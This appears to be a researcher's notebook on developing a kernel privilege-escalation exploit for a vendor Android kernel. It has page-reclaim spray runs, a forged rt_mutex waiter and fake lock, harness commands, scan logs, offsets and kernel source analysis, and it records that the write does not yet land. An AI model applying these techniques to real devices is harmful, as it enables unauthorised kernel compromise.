# Ring-1 reclaim identity: the scan oracle works, and the reclaim does not land

Date: 2026-10-06 (evening). Runs: `scan1`..`scan11` in `scratch/runs/`.

## 0. TL;DR

1. Three blockers that had silently prevented the reclaim-page oracle from ever
   running were found and fixed (harness syntax, "reboot between runs",
   `verify_paint_gate()` wedging on `open("/dev/ashmem")`).
2. The new multi-socket scan oracle now runs end-to-end and reports:
   **`msgs=8192 sockets=10 hits=0` — not one byte of any of the 8192 reclaim
   fragment pages differs from the payload.**
3. `CONFIG_DEBUG_QSPINLOCK_OWNER=y` is confirmed *and* the vendor write is
   unconditional (no static key), so a successful `rtmutex.c:585` trylock leaves
   a permanent `owner_cpu=0xffffffff / owner=(void*)-1` stamp. The negative is
   therefore a real measurement, not an artifact.
4. `IONSTACK_FOPS_WAIT_LOCK_WORD=1` makes the consumer **freeze**
   (`consumer_success=0`) **78 % of the time** (7/9); with `wlw=0` it freezes
   14 % of the time (5/35, Fisher p ~ 5e-4). The association is real but not
   deterministic, and it is fully described by "the payload reaches `page_base`
   about 84 % of the time, and when it does the word steers the trylock"
   (§6). So the kernel *does* read our payload byte at `fake_lock+0` -- usually.
5. Points 2 and 4 contradict each other unless the page holding our payload at
   `page_base` is **not** one of the 8192 queued fragment pages. Resolving that
   is the next step (§8), and the per-message identity tag added in §2.1 is the
   instrument for it.
6. **The spray is smaller than the design assumes**: neither the precreate nor
   the pre-target spray ran (`sends=0/0`), so the 8192 post-target messages are
   the *only* payload-bearing pages in the process (§6b). That removes one of the
   candidate explanations for §7.

## 1. Three blockers, in the order they were hit

### 1.1 `scratch/run_paint.sh` would not parse
`scan4` died with `syntax error near unexpected token '('`. The reboot-cleanup
block that had been inserted near the top was fine on its own; the file as a
whole did not parse. Rebuilt the block (and `bash -n` / `sh -n` now both pass).

### 1.2 Every run that followed a non-rebooted run wedged its perf target
The correlation is 5/5 and process-sniffing is **not** a sufficient trigger:

| run   | preceded by              | perf target outcome |
|-------|--------------------------|---------------------|
| scan1 | reboot (fill3 panic)     | SAMPLE -> READY -> LEAK_OK |
| scan2 | reboot (scan1)           | SAMPLE -> READY -> LEAK_OK |
| scan3 | scan2, no reboot         | **no SAMPLE** -> `target leak did not become ready` |
| scan4 | reboot (scan3)           | SAMPLE -> READY -> LEAK_OK |
| scan5 | scan4, no reboot         | **no SAMPLE** -> `target leak did not become ready` |
| scan6 | reboot (manual)          | SAMPLE -> READY -> LEAK_OK |
| scan7 | reboot (harness)         | SAMPLE -> READY -> LEAK_OK |
| scan8 | reboot (harness)         | SAMPLE -> READY -> LEAK_OK |
| scan9 | reboot (harness)         | SAMPLE -> READY -> LEAK_OK |
| scan10| reboot (harness)         | SAMPLE -> READY -> LEAK_OK |
| scan11| reboot (harness)         | SAMPLE -> READY -> LEAK_OK |

scan5's device was verified **clean** (`ps` showed no ionstack task, zero
leftovers) before launch, yet its target still starved. So the poison is
kernel-side state that outlives the process, not a visible task.

The perf target's sampling loop is CPU-bound with a hard 30 s budget
(`TARGET_READY_TIMEOUT_MS 30000`), so it simply loses the race on a busy
machine. `spawn_child()` does **no** nice/affinity change -- it is `clearenv()`
+ `execv()`, so contention is the whole story.

Fix: `scratch/run_paint.sh` now **reboots unconditionally** before every run and
waits for boot's load spike to decay (`NO_REBOOT=1` opts out). Result: 5
consecutive LEAK_OK (scan7-scan11) where 2 of the previous 5 runs died in stage 0.

### 1.3 `verify_paint_gate()` wedges on `open("/dev/ashmem")` -- the real reason the scan never ran
`scan6` printed `ring1-lock585` and then sat **silent for the full 300 s harness
budget**. The device was responsive (boot_id polling worked, no reboot), so the
exploit process was stuck in userspace.

`verify_paint_gate()` (main.c:1649) ends with:

```c
free(snap);
int fd = open_ashmem_device();                       /* <-- wedges here */
...
ssize_t n = configfs_read_once(fd, data_addr(ASHMEM_MISC_FOPS), &got, ...);
pr_success("ring1-read ...");
```

In the ring-1-only stage the write gate blocks ring 2, so this readback never
completes -- which is exactly what the harness comment above `MARKER` had warned
about all along ("Do NOT wait for `ring1-read` ... it would never arrive and the
loop would burn all WAIT_ITERS"). Because `scan2` had used the default MARKER
(which contains `ring1-page`), the loop broke at `ring1-page` and killed the
runner *before* the scan; and when the scan was requested, the process wedged in
this open instead.

Fix: `ring1-read` is now skipped whenever `IONSTACK_RECLAIM_SCAN_QUEUE != 0`
(the scan never touches `/dev/ashmem`). The harness MARKER default also drops
`ring1-page` when the scan is enabled. It first matched the scan's *first* report
line (`reclaim-scan msgs=`), which turned out to be the same mistake one level
down -- the runner was killed before the identity lines printed -- so it now
matches the unconditional terminator `reclaim-scan done` (§2.1).

## 2. The scan oracle

`scan_reclaim_queue_for_writes()` (util.c) walks **every** reclaim socket queue
and reports every fragment-page byte that differs from the payload.

* Geometry, re-verified end to end by the log itself:
  `msg=8e80 head=e80`, `consumed=7808=0x1E80` (= head 0xE80 + spliced 0x1000),
  `rel0=1e80`. Message `k`'s frag page is stream `[k*0x8E80 + 0xE80, +0x8000)`.
* The reclaim message is a **single iovec** (`msg_iovlen = 1`, `iov_base =
  skb_buf`, `iov_len = reclaim_send_size`) and `SKB_FRAG_BIAS == 0`, so stream
  byte `o` **is** `skb_buf[o]` -- the comparison reference is exact.
* Classification offsets: `LOCK_OFF + SKB_DATA_DELTA = 0x4D0`,
  `FOPS_OFF + SKB_DATA_DELTA = 0x180`,
  `SCRATCH_OFF + SKB_DATA_DELTA = 0x2180`.
* Extra sockets are now **kept alive** for the scan
  (`reclaim-extra-keep sockets=N`). Previously
  `close_reclaim_socket_pairs(posttarget_extra_sv, ...)` freed ~90 % of the
  fragments before the consumer fired *and* hid them from the scan.

Run it with:

```
TAG=scanN WAIT_ITERS=140 IONSTACK_RECLAIM_SCAN_QUEUE=1 ./scratch/run_paint.sh
```

Do **not** set `IONSTACK_RECLAIM_POSTTARGET_MAX_SOCKETS=1`: that confines the
whole spray to one queue (904 messages, the 32 MB receiver limit) and, as scan8
showed, that spray contains nothing the kernel writes to.

### 2.1 The per-message identity tag (`IONSTACK_RECLAIM_TAG=1`)

Added 2026-10-06. The scan above answers "was any *queued* page written?" but not
"is the page at `page_base` one of the queued pages?" -- because every reclaim
message is a byte-identical copy of `skb_buf`, so a page that carries our payload
is indistinguishable from a page that merely *looks* like it.

`reclaim_stamp_tag()` (util.c) increments a process-wide counter and writes it
into `skb_buf[RECLAIM_TAG_OFF]` immediately before **every** reclaim `sendmsg`
(all four sites: precreate, pre-target, post-target-search, plain). The slot is
payload offset `0x6000` -> frag-page offset `0x5180`, inside the order-3 page,
past `0xE80` (so it really travels in the frag page rather than the skb linear
head) and clear of every shape offset. With the knob off the byte stays at the
`memset` value `0x41`, so every existing configuration is byte-for-byte
unchanged.

What it buys:

* `reclaim-scan tag=1 sent=N range=A..B ok=K bad=K dup=K absent=M` -- `absent`
  is the number of sequence numbers inside the observed range that **no queue
  carries**. That is the only way to see a frag page the kernel can read but we
  cannot: it is simply missing from the stream.
* `reclaim-scan tag-absent first=<list>` -- names them.
* `reclaim-scan tag-first-bad socket= msg= have= want=` -- the first stream
  position whose tag is not the expected `first_seq + k`, i.e. exactly where a
  gap in the queue would shift every later message.
* `reclaim-scan tag-held socket=0 msg= seq=` -- which message
  `hold_first_reclaim_fragment()` spliced into the pipe.
* `page-dump ... msg_tag=<hex>` -- the same identity read back out of the held
  page itself.
* `reclaim-scan done ...` -- an unconditional terminator, so the harness MARKER
  cannot kill the runner before the report is complete.

Whole-page comparisons against `skb_buf` (`validate_held_reclaim_fragment()`,
`dump_reclaim_page_state()`) skip the tag span via `reclaim_tag_span()`: the tag
is *supposed* to differ per message, so counting it as a mutation would make the
oracle fire on every run.

Run it with:

```
TAG=scanN WAIT_ITERS=140 IONSTACK_RECLAIM_SCAN_QUEUE=1 IONSTACK_RECLAIM_TAG=1 \
  ./scratch/run_paint.sh
```

## 3. Measured result (scan10, scan11)

```
reclaim-scan enter sv=1669 msg=36480 consumed=7808 extras=9
reclaim-scan socket=0 start=7808 scanned=904 hits=0
reclaim-scan socket=1..8 start=0 scanned=904 hits=0
reclaim-scan socket=9 start=0 scanned=56 hits=0
reclaim-scan msgs=8192 sockets=10 hits=0 hit_msgs=0 lock=0 fops=0 scratch=0 other=0
reclaim-scan first=none -- every fragment on every socket still matches the payload
```

8192 pages x 0x8000 bytes = 256 MB compared, zero differences.

## 3.1 The tag oracle, verified end to end (scan12)

`scan12` was the first run with `IONSTACK_RECLAIM_TAG=1`, and it **panicked at the
consumer** (`page-dump tag=pre-arm` was the last line, `same_boot=0`,
`device_rc=255`) -- the known ~50/50 crash-vs-survive coin flip, not a tag
artefact: the tag lives at frag-page offset `0x5180`, while the walk only ever
touches `fake_lock + 0x00..0x20` = page offset `0x4d0..0x4f0`.

What it did prove, before dying:

```
[*] reclaim-tag enabled=1 off=6000 page_off=5180 bytes=4
[+] page-dump tag=pre-arm base=ffffffc857b58000 ... first_diff=8000(pristine)
    msg_tag=00000001 wait_lock=00000000 ...
```

* `off=6000 page_off=5180` -- the compiled-in geometry is exactly the designed
  one.
* `msg_tag=00000001` -- the held page **names itself** as sequence 1, which is
  what `reclaim_socket_first_seq[0] + 0` predicts (message #0 of socket #0, and
  no precreate/pretarget send consumed a sequence number). The stamp therefore
  survives the send, the splice, the `tee` and the `MSG_PEEK` reassembly.
* `first_diff=8000(pristine)` -- the whole-page comparison still reports
  pristine, i.e. `reclaim_tag_span()` correctly excludes the 4 tag bytes instead
  of reporting them as a mutation.

So the instrument works; scan12 just needs a rerun to get past the coin flip.

### 3.2 Operational note: the scan configuration only survives ~1 run in 8

With `IONSTACK_RECLAIM_SCAN_QUEUE=1` (9 extra sockets held = all 8192 frag pages
kept live) the outcome at the consumer is much worse than the ~50/50 the earlier
note recorded:

| run    | outcome at the consumer                        |
|--------|------------------------------------------------|
| scan6  | froze (`consumer_success=0`) -- scan ran        |
| scan7  | **panic** at `page-dump tag=pre-arm`            |
| scan8  | froze -- scan ran                               |
| scan9  | **panic** at `page-dump tag=pre-arm`            |
| scan10 | survived (`consumer_success=1`) -- scan ran     |
| scan11 | froze -- scan ran                               |
| scan12 | **panic** at `page-dump tag=pre-arm`            |
| scan13 | **panic** at `page-dump tag=pre-arm`            |

4 panics / 3 freezes / 1 clean survive. The panic signature is always identical:
`page-dump tag=pre-arm` is the last line and the device reboots (`same_boot=0`,
`device_rc=255`) -- i.e. the crash is the consumer's chain walk, and it happens
*after* the pre-arm dump and *before* the post-arm one.

**Workaround: run with `IONSTACK_FOPS_WAIT_LOCK_WORD=1`.** The failed trylock
turns `rtmutex.c:585` into the `raw_spin_unlock_irq(&task->pi_lock) / cpu_relax()
/ goto retry` loop, which holds nothing, so the machine stays up, `paint-result`
is still printed, and -- as scan11 proved -- the post-arm dumps **and the whole
queue scan still run**. That converts a 12.5 % success rate into ~78 % (the
`wlw=1` freeze rate from §6). It costs nothing for the identity measurement:
`absent` and the tag range come from the frag pages, not from the lock.

### 3.3 The scan's tag coordinate was wrong: `rel` is a payload offset, not a page offset

`scan14` (the first `wlw=1` run to complete, boot id unchanged, full report
printed) exposed a defect in the *scan's* tag decode -- not in the tag itself:

```
[+] page-dump tag=pre-arm  ... first_diff=8000(pristine) msg_tag=00000001 ...   <- correct
[+] reclaim-scan first socket=0 msg=0 page_off=5180 (payload_off=6000) have=01 want=09
[+] reclaim-scan tag=1 sent=8201 range=0..0 ok=0 bad=8192 dup=1 undecoded=0 absent=0
[+] reclaim-scan tag-first-bad socket=0 msg=0 have=0 want=1
```

Two conventions coexist in this file and they were crossed:

* `dump_reclaim_page_state()` / `validate_held_reclaim_fragment()` index a
  **page** buffer, so `RECLAIM_TAG_OFF + SKB_DATA_DELTA == 0x5180` is the right
  page offset, and `reclaim_tag_span(i + (-SKB_DATA_DELTA))` correctly converts
  a page index back to a payload offset.
* `scan_one_reclaim_socket()` compares `buf[i]` against `ref[rel]` where
  `ref == skb_buf`, i.e. `rel` **is** a payload offset and the page offset is
  derived as `rel - head`.

The scan therefore tested `rel == 0x5180` instead of `rel == RECLAIM_TAG_OFF ==
0x6000` -- 0xE80 bytes early, on `memset` filler that always reads 0. Hence
`range=0..0 / ok=0 / bad=8192` with zero undecoded. The real tag then fell
through to the mutation accounting, producing exactly one bogus hit per message
-- visible as `first ... page_off=5180 have=01 want=09`: the message's **own**
tag byte `1` against `skb_buf`'s **last** stamp `9`. That is also why the old
`hits=16341 / hit_msgs=8191` never dropped to 0: the tag slot was never skipped.

Fix: test `rel == RECLAIM_TAG_OFF` (constant renamed `tag_rel`), keep everything
else. `absent=0` from scan14 is consequently **not yet trustworthy** -- it was
computed over 8192 decodes that all read filler.

**The diagnosis closes arithmetically, and it yields an exact prediction.**
The 16341 hits decompose with no residue, using nothing but the fact that
`skb_buf` carries the *last* stamp:

* the last successful send is sequence `8201` = `0x2009`, so `skb_buf`'s tag
  bytes are `09 20 00 00`;
* message `s` differs from it in byte 0 unless `s % 256 == 9` (33 of the 8192
  present sequence numbers) and in byte 1 unless `s >> 8 == 0x20` (the 10 values
  8192..8201); bytes 2/3 are 0 in both;
* `(8192 - 33) + (8192 - 10) = 8159 + 8182 = 16341` -- the reported `hits`
  exactly, with `hit_msgs=8191` (every message but the last-stamped one).

`sent=8201` versus `scanned=8192` is likewise exact: the post-target loop
`reclaim_stamp_tag()`s *before* `sendmsg`, so each of the 9 `EAGAIN`
(`last_errno=11`) socket-full events burns one sequence number:

| socket | messages | tags | burned |
|--------|----------|------|--------|
| 0      | 904      | 1..904       | 905    |
| 1..8   | 904 each | 906..8144    | 1810, 2715, 3620, 4525, 5430, 6335, 7240, 8145 |
| 9      | 56       | 8146..8201   | --     |

`8201 - 8146 + 1 = 56` matches `socket=9 scanned=56`, and `9 x 904 + 56 = 8192`.

Therefore the corrected run must print **`range=1..8201 ok=8192 bad=0 dup=0
undecoded=0 absent=9`** with `tag-absent first=905,1810,2715,3620,4525,5430,
6335,7240,8145`, and `hits=0` -- because every remaining difference from
`skb_buf` was the tag. Any hit that survives is a genuine kernel write. That is
the real deliverable of this whole instrument.

### 3.4 scan15: the prediction lands exactly, and the oracle is now trustworthy

`TAG=scan15 WAIT_ITERS=140 IONSTACK_RECLAIM_SCAN_QUEUE=1 IONSTACK_RECLAIM_TAG=1
IONSTACK_FOPS_WAIT_LOCK_WORD=1 ./scratch/run_paint.sh` (same boot id, marker seen):

```
[+] reclaim-scan socket=0 start=7808 scanned=904 hits=0
[+] reclaim-scan socket=1..8 start=0 scanned=904 hits=0
[+] reclaim-scan socket=9 start=0 scanned=56 hits=0
[+] reclaim-scan msgs=8192 sockets=10 hits=0 hit_msgs=0 lock=0 fops=0 scratch=0 other=0
[+] reclaim-scan first=none -- every fragment on every socket still matches the payload
[+] reclaim-scan tag=1 sent=8201 range=1..8201 ok=8192 bad=0 dup=0 undecoded=0 absent=9
[+] reclaim-scan tag-absent n=9 first=905,1810,2715,3620,4525,5430,6335,7240,8145
[+] reclaim-scan tag-held socket=0 msg=0 seq=1
[+] reclaim-scan done hits=0 scanned=8192 sockets=10 tag=1
```

Every clause of the §3.3 prediction holds:

* `range=1..8201`, `ok=8192`, `bad=0`, `dup=0`, `undecoded=0` -- all 8192 real
  messages decoded, each carrying exactly the sequence number predicted from its
  socket and stream position. The tag survives send -> splice -> `tee` ->
  `MSG_PEEK` for every message.
* `absent=9`, and `tag-absent first=` is **exactly** `905,1810,...,8145` -- the
  nine sequence numbers burned by the nine `EAGAIN` socket-full events. Values
  derived from an independent mechanism (the send loop's stamp-then-send order),
  predicted before the run, and confirmed byte for byte.
* `hits=0` -- the 16341 tag artefacts are gone and **not one byte of any of the
  8192 queued fragment pages (256 MB compared) differs from the payload.**

Two consequences, both now solid:

1. The identity instrument works, so `absent` is meaningful. Here it proves the
   queues are *complete*: every sequence number that was actually sent is
   present, so no frag page is hiding outside the scan.
2. Combined with §3.3, the reclaim's own pages are therefore fully accounted for,
   and **none of them was written by the kernel.** The ring-1 write did not land
   on any page we still hold.

## 4. A successful 585 IS detectable -- config + source proof

`/proc/config.gz` on the device:

```
CONFIG_ARCH_USE_QUEUED_SPINLOCKS=y
CONFIG_DEBUG_QSPINLOCK_OWNER=y
# CONFIG_DEBUG_SPINLOCK is not set
# CONFIG_DEBUG_LOCK_ALLOC is not set
# CONFIG_DEBUG_RT_MUTEXES is not set
```

`include/asm-generic/qspinlock_types.h` gives `arch_spinlock_t` size 0x10
(`{val; owner_cpu; owner;}`) -- which is exactly why
`waiters.rb_root@0x10 / rb_leftmost@0x18 / owner@0x20`, so `offset.h` was right.

`include/asm-generic/qspinlock.h` -- **unconditional, no static key**:

```c
#ifdef CONFIG_DEBUG_QSPINLOCK_OWNER
static __always_inline void queued_spin_set_owner(struct qspinlock *lock)
{	lock->owner_cpu = raw_smp_processor_id();	lock->owner = current; }
static __always_inline void queued_spin_clear_owner(struct qspinlock *lock)
{	lock->owner_cpu = -1;	lock->owner = SPINLOCK_OWNER_INIT; }
#endif
```

**This vendor tree also modifies `queued_spin_trylock` itself** (line 84-92) --
upstream 4.19 only does the cmpxchg:

```c
static __always_inline int queued_spin_trylock(struct qspinlock *lock)
{
	if (!atomic_read(&lock->val) &&
	   (atomic_cmpxchg_acquire(&lock->val, 0, _Q_LOCKED_VAL) == 0)) {
		queued_spin_set_owner(lock);     /* <-- vendor addition */
		return 1;
	}
	return 0;
}
```

and `queued_spin_unlock` calls `clear_owner` before the release store:

```c
static __always_inline void queued_spin_unlock(struct qspinlock *lock)
{
	queued_spin_clear_owner(lock);
	smp_store_release(&lock->locked, 0);
}
```

So a **successful** `585` + the matching unlock leaves
`owner_cpu = 0xffffffff`, `owner = 0xffffffffffffffff` (both differ from the
payload's `0 / 0`) and restores `wait_lock.val` to 0. The `owner`/`owner_cpu`
stamp is permanent; `wait_lock.val` alone is not. A **failed** trylock writes
nothing, so the scan is blind to the spin case -- that asymmetry is what makes §6
necessary.

## 5. The chain-walk gates, from our own tree

`kernel/locking/rtmutex.c` (T878USQS8DXE2):

```c
/* rt_mutex_adjust_pi, 1130-1146 */
waiter = task->pi_blocked_on;
if (!waiter || rt_mutex_waiter_equal(waiter, task_to_waiter(task))) {   /* 1135 */
	raw_spin_unlock_irqrestore(&task->pi_lock, flags);
	return;
}
next_lock = waiter->lock;
raw_spin_unlock_irqrestore(&task->pi_lock, flags);
rt_mutex_adjust_prio_chain(task, RT_MUTEX_MIN_CHAINWALK, NULL, next_lock, NULL, task);
```

```c
/* rt_mutex_adjust_prio_chain, 448-589 */
again: if (++depth > max_lock_depth) return -EDEADLK;          /* 474 */
retry: raw_spin_lock_irq(&task->pi_lock);                       /* 502 */
       waiter = task->pi_blocked_on;                            /* 507 */
       if (!waiter) goto out_unlock_pi;                         /* 518 */
       if (orig_waiter && !rt_mutex_owner(orig_lock)) ...       /* 525  skipped */
       if (next_lock != waiter->lock) goto out_unlock_pi;       /* 537 */
       if (top_waiter) { ... }                                  /* 545-560 skipped */
       if (rt_mutex_waiter_equal(waiter, task_to_waiter(task))) /* 569 */
               if (!detect_deadlock) goto out_unlock_pi;
       lock = waiter->lock;                                     /* 579 */
       if (!raw_spin_trylock(&lock->wait_lock)) { ... retry; }   /* 585 */
```

* `task_to_waiter(p)` = `{.prio = p->prio, .deadline = p->dl.deadline}` (line 230).
* `top_waiter = orig_waiter = NULL` for `rt_mutex_adjust_pi`, so **545-560 and
  525 are unreachable**.
* `detect_deadlock = chwalk == RT_MUTEX_FULL_CHAINWALK` because
  `CONFIG_DEBUG_RT_MUTEXES` is off -- and `chwalk` is `MIN_CHAINWALK`, so
  **`detect_deadlock == false`**: at 569 an equal waiter exits the walk.
* The paint sets `waiter->prio = 0x7fffffff` while `W->prio = 120 + nice = 121`,
  so 1135 and 569 both pass and `579/585` **must** be reached.

So the only ways to avoid touching `fake_lock` are: `W->pi_blocked_on == NULL`
(1135/518), `next_lock != waiter->lock` (537), or `waiter->lock` pointing
somewhere other than our page.

## 6. The discriminator: `wlw=1` freezes the consumer -- but only statistically

scan11, `IONSTACK_FOPS_WAIT_LOCK_WORD=1`:

```
payload ... wait_lock_word=00000001
page-dump tag=pre-arm   ... wait_lock=00000001
paint-result ... consumer_calls=1 consumer_success=0     <-- SPUN
page-dump tag=post-arm  ... wait_lock=00000001           <-- unchanged
ring1-lock585 hit=0 wait_lock=00000001
reclaim-scan msgs=8192 sockets=10 hits=0 ...
```

A failed trylock writes nothing, so `hits=0` here is expected and carries no
information. The **freeze** does carry information: the trylock can only fail
because `*(u32*)fake_lock` read non-zero, and the only place that value exists is
our payload -- so the kernel read our payload byte at `fake_lock + 0`.

**Correction (2026-10-06, late): this is a statistical signal, not a proof.**
Over every run in `scratch/runs/` that reached `paint-result`:

| `wait_lock_word` | `consumer_success=0` (froze) | `consumer_success=1` | P(freeze) |
|------------------|------------------------------|----------------------|-----------|
| `0`              | 5 (`paint_20261005_193115`, `scan2`, `scan4`, `scan6`, `scan8`) | 30 | 0.14 |
| `1`              | 7 (`ring1j`, `ring1n`, `ring1u`, `wa_r1`, `w1_r1`, `a2_r2`, `scan11`) | 2 (`g1_r1`, `a2_r1`) | 0.78 |

Fisher exact two-sided p ~ 5e-4, so the association is real and strong -- but
`wlw=1` froze only **7 of 9** times, and `wlw=0` froze **5 of 35**. Neither
direction is deterministic, so no single run proves anything.

The table is, however, completely described by a one-parameter model:

> Let `p` = P(the page at `page_base` carries our payload). If it does, the word
> the trylock reads is exactly `wait_lock_word`, so the consumer freezes iff
> `wlw != 0`. If it does not, the word is live kernel memory -- non-zero with
> some probability `q`.

Fitting: present-and-froze = 7 (`wlw=1`), present-and-ran = 30 (`wlw=0`) give
`p ~= 37/44 = 0.84`; the 7 remaining runs (5 froze, 2 ran) give `q ~= 5/7`.

**So the honest statement is: the payload reaches `page_base` about 84 % of the
time, and when it does, `wait_lock_word` steers the trylock.** "The walk reaches
585 with `lock == fake_lock`" is therefore true *in those 84 %* -- which is
enough to keep §7's contradiction alive, but not enough to call it proven.

## 6b. The spray is smaller than the design assumes

`reclaim-pretarget phase=pretarget-send-late sends=0/0` and there is **no
`reclaim-precreate` line at all** in scan10/scan11:

* `run_reclaim_precreate_spray()` returns immediately when
  `IONSTACK_RECLAIM_PRECREATE_SENDS` is 0 (util.c:621-626) -- and it defaults to
  0.
* `pretarget_send_limit` is 0 because `ionstack_reroot_device.c` hardcodes
  `{"IONSTACK_RECLAIM_PRETARGET_SENDS", "0"}` and the harness does not override
  it. **`IONSTACK_RECLAIM_PRETARGET_SENDS` and `IONSTACK_RECLAIM_PRECREATE_SENDS`
  are now host-overridable** (default still `"0"`, so the configuration is
  unchanged) -- without that the shaping could not be re-enabled without a
  rebuild.

So the only payload-bearing pages in the whole process are the **8192
post-target messages** (plus their linear heads). That matters for §7: the
"payload present at `page_base`" cannot come from a precreate or pretarget
spray, because neither ran. The comment above
`IONSTACK_RECLAIM_PRETARGET_HOLD` in the harness says the held pre-target order-3
spray exists so "a just-freed shaping block does not win the post-target
allocation ahead of the slab page under test" -- with both sprays at 0 that
shaping is simply absent.

## 7. The open contradiction

* §6: the walk reaches 585 with `lock == fake_lock` **in about 84 % of runs**.
* §4: with `wlw=0` the trylock succeeds and stamps `owner_cpu=0xffffffff`,
  `owner=-1` permanently.
* §3: scan10 (`wlw=0`, `consumer_success=1`) shows `hits=0` over all 8192 pages.

These cannot all be true if `page_base` is one of the 8192 queued fragment pages.
The consistent reading is:

> **`page_base` holds our payload (that is why `wlw` steers the trylock), but
> the page the kernel is operating on is NOT one of the pages sitting in the
> reclaim socket queues.**

In other words the reclaim *content* lands (a payload-bearing page ends up at
`fake_lock`) while the reclaim *identity* does not (that page is not a page we
can read back). Candidate mechanisms:

* the mm slab page is reused by the kernel for something other than our frag
  page, while the payload-shaped bytes are left over from a **previous
  occupant** -- and the only payload-bearing pages this process ever created are
  the 8192 post-target ones (§6b), so "previous occupant" now means either a
  page that was allocated and then released again, or a page of the *same* spray
  that we simply cannot see;
* the reclaim lands on a message that `hold_first_reclaim_fragment()` spliced
  out of the queue -- ruled out for message #0, whose page is pristine, and only
  testable for other messages with the tag oracle;
* the write *does* land in a queued page but is reverted -- rejected, because
  `clear_owner` leaves `0xffffffff` / `-1`, never the payload's `0 / 0`.

## 8. Next steps

1. ~~**Make reclaim identity observable.**~~ **Done** -- §2.1, `IONSTACK_RECLAIM_TAG`.
   `reclaim-scan tag=1 ... absent=M` is now the decisive measurement: if `M == 0`
   every one of the 8192 frag pages is in a queue we can read, so `page_base` is
   not one of them and the reclaim genuinely does not land; if `M > 0`,
   `tag-absent first=` names the page the kernel is using and
   `IONSTACK_RECLAIM_FRAG_SKIP_MSGS` aims the held-page oracle straight at it.
2. **Re-test `wlw=0` several times.** The 2x2 table in §6 already says `hits=0`
   is the stable outcome while `consumer_success=1` dominates (30/35), so the §7
   reading stands; more runs only tighten the estimate of `p`.
3. **Re-enable the shaping.** `IONSTACK_RECLAIM_PRETARGET_SENDS=1` (now
   host-overridable, §6b) makes the design's "hold one pre-target order-3
   fragment so the freed slab page's buddy is not stolen" actually happen. This
   is the cheapest lever that could turn `absent=M>0` into `absent=0`.
4. **Prove `page_base` membership directly.** `IONSTACK_RECLAIM_PFN_IDENTITY`
   and `reclaim-pfn-result` are all-zero on this image (the perf PFN oracle is
   dead), so this needs a userspace-visible identity signal, not perf -- the tag
   is that signal.
5. Once identity is observable, the ring-1 target is `fake_lock` in a page we
   actually hold; only then does the `wlw`-driven 585 oracle become meaningful.
6. Still open from before: a dedicated `PROBE_LOCK_OFF` decoupled from
   `SCRATCH_OFF`/binwrite, and the K40 `res_in`/`res_out` pselect paint surface.
7. `IONSTACK_RECLAIM_CORRELATE`'s loop writes a **constant** `0x12345000` into
   every 0x20-aligned slot, but the comment in `ionstack_reroot_device.c` says it
   should write `0x12345000 + (chunk / ORDER3_SIZE) * 0x10000` so the `root=`
   field names the chunk. As written it cannot identify anything. Either fix it
   to match its documentation or delete the knob.
